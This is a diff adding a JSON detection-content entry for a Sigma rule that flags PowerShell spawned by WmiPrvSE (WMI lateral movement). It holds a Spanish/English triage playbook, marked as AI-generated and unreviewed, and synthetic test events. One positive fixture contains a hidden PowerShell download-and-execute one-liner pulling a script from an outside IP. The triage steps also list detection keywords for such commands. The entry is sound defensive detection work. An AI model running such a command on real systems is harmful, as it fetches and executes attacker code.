@@ -1,0 +1,140 @@
+{
+  "rule": {
+    "id": "692f0bec-83ba-4d04-af7e-e884a96059b6",
+    "title": "Potential WMI Lateral Movement WmiPrvSE Spawned PowerShell",
+    "level": "medium",
+    "status": "stable",
+    "author": "Markus Neis @Karneades",
+    "path": "windows/process_creation/proc_creation_win_wmiprvse_spawns_powershell.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_wmiprvse_spawns_powershell.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1047",
+      "T1059.001"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se creó un proceso de PowerShell (powershell.exe o pwsh.exe) cuyo proceso padre es WmiPrvSE.exe. Esto puede indicar que alguien ejecutó comandos de forma remota mediante WMI para moverse lateralmente.",
+      "what_it_detects": "Eventos de creación de procesos en Windows con ParentImage terminado en \\WmiPrvSE.exe e Image terminado en \\powershell.exe o \\pwsh.exe. También detecta binarios renombrados, porque coincide con OriginalFileName igual a PowerShell.EXE o pwsh.dll.",
+      "why_it_matters": "WmiPrvSE.exe lanza los procesos que se crean mediante WMI, por ejemplo con Win32_Process.Create desde otro equipo. Un atacante con credenciales válidas puede ejecutar PowerShell de forma remota (T1047 y T1059.001) y luego descargar payloads, robar credenciales o moverse lateralmente.",
+      "triage_steps": [
+        "Revise CommandLine de PowerShell: busque -EncodedCommand, -WindowStyle Hidden, -ExecutionPolicy Bypass, IEX, DownloadString o URL externas, y decodifique el contenido en Base64.",
+        "Identifique el usuario que ejecutó el proceso y compruebe si es una cuenta de servicio de administración conocida o una cuenta de usuario normal.",
+        "En el mismo host, en una ventana de +/- 15 minutos, busque eventos 4624 tipo 3 para encontrar la IP de origen y la cuenta de la conexión WMI/DCOM remota.",
+        "Verifique si Image está en una ruta estándar (System32\\WindowsPowerShell o Program Files\\PowerShell). Si OriginalFileName coincide pero el nombre o la ruta no, trátelo como binario renombrado.",
+        "Revise los procesos hijos, las conexiones de red, los archivos creados y las claves de registro modificadas por el proceso PowerShell.",
+        "Busque suscripciones WMI persistentes (Sysmon 19, 20 y 21) y alertas anteriores para el mismo host, el mismo usuario y la misma IP de origen.",
+        "Consulte con el equipo de TI si en ese momento se ejecutaron tareas de SCCM/CCM, App-V o WinRM en el host."
+      ],
+      "false_positives": [
+        "Agente de Configuration Manager (CCM/SCCM) que ejecuta scripts o evaluaciones de cumplimiento mediante WMI.",
+        "Cliente App-V (AppvClient) que lanza PowerShell durante la publicación o actualización de paquetes.",
+        "Administración remota legítima mediante WinRM o Invoke-WmiMethod por parte de administradores autorizados.",
+        "Herramientas de inventario, monitoreo o EDR que ejecutan PowerShell mediante WMI."
+      ],
+      "response_steps": [
+        "Confirme con el responsable del host y el equipo de TI si la ejecución fue autorizada. Documente la línea de comandos, el usuario y la IP de origen.",
+        "Si no está autorizada, aísle el endpoint de la red y deshabilite o restablezca la cuenta usada, previa coordinación con el equipo de identidades.",
+        "Busque la misma IP de origen y la misma cuenta en otros equipos para delimitar el alcance del movimiento lateral.",
+        "Elimine las suscripciones WMI, las tareas o los archivos maliciosos confirmados y bloquee los hash y dominios identificados.",
+        "Restaure el equipo desde una imagen confiable si hubo compromiso confirmado y rote las credenciales expuestas."
+      ],
+      "severity_rationale": "La severidad media es adecuada porque este patrón es típico de ejecución remota maliciosa, pero también lo generan herramientas legítimas como SCCM, App-V y WinRM, por lo que requiere validar el contexto."
+    },
+    "en": {
+      "summary": "PowerShell (powershell.exe or pwsh.exe) was started with WmiPrvSE.exe as its parent process. This can mean commands were run remotely through WMI to move laterally.",
+      "what_it_detects": "Windows process creation events where ParentImage ends with \\WmiPrvSE.exe and Image ends with \\powershell.exe or \\pwsh.exe. Renamed binaries are also caught, because the rule matches OriginalFileName PowerShell.EXE or pwsh.dll.",
+      "why_it_matters": "WmiPrvSE.exe starts processes created through WMI, for example with Win32_Process.Create from another machine. An attacker with valid credentials can run PowerShell remotely (T1047, T1059.001), then download payloads, dump credentials or move to other hosts.",
+      "triage_steps": [
+        "Check the PowerShell CommandLine for -EncodedCommand, -WindowStyle Hidden, -ExecutionPolicy Bypass, IEX, DownloadString or external URLs. Decode any Base64 content.",
+        "Find the user that ran the process. Is it a known management service account or a regular user account?",
+        "On the same host, within +/- 15 minutes, look for 4624 type 3 logons to find the source IP and account of the remote WMI/DCOM connection.",
+        "Check that Image is in a standard path (System32\\WindowsPowerShell or Program Files\\PowerShell). If OriginalFileName matches but the name or path does not, treat it as a renamed binary.",
+        "Review the child processes, network connections, file writes and registry changes made by the PowerShell process.",
+        "Look for persistent WMI subscriptions (Sysmon 19, 20, 21) and earlier alerts for the same host, user and source IP.",
+        "Ask IT whether SCCM/CCM, App-V or WinRM tasks ran on the host at that time."
+      ],
+      "false_positives": [
+        "Configuration Manager (CCM/SCCM) agent running scripts or compliance evaluations through WMI.",
+        "App-V client (AppvClient) starting PowerShell during package publishing or refresh.",
+        "Legitimate remote administration with WinRM or Invoke-WmiMethod by authorized admins.",
+        "Inventory, monitoring or EDR tools that run PowerShell through WMI."
+      ],
+      "response_steps": [
+        "Confirm with the host owner and IT whether the execution was authorized. Record the command line, user and source IP.",
+        "If it was not authorized, isolate the endpoint and disable or reset the account used, working with the identity team.",
+        "Search other hosts for the same source IP and account to scope the lateral movement.",
+        "Remove confirmed malicious WMI subscriptions, tasks or files, and block the hashes and domains you identified.",
+        "If compromise is confirmed, reimage from a trusted baseline and rotate the exposed credentials."
+      ],
+      "severity_rationale": "Medium fits because this pattern is typical of malicious remote execution, but SCCM, App-V and WinRM also produce it, so the context needs to be checked."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "WmiPrvSE spawns a hidden PowerShell that downloads a script, typical of remote Win32_Process.Create execution",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+          "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')\"",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "Renamed PowerShell 7 binary launched by WmiPrvSE, caught through OriginalFileName pwsh.dll",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-FILE-02.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+          "Image": "C:\\Users\\Public\\update.exe",
+          "OriginalFileName": "pwsh.dll",
+          "CommandLine": "update.exe -nop -c Get-Process",
+          "IntegrityLevel": "High"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "WmiPrvSE spawns cmd.exe, not PowerShell, so selection_img does not match",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "OriginalFileName": "Cmd.Exe",
+          "CommandLine": "cmd.exe /c ipconfig /all",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "User opens PowerShell interactively from Explorer, so the parent is not WmiPrvSE",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
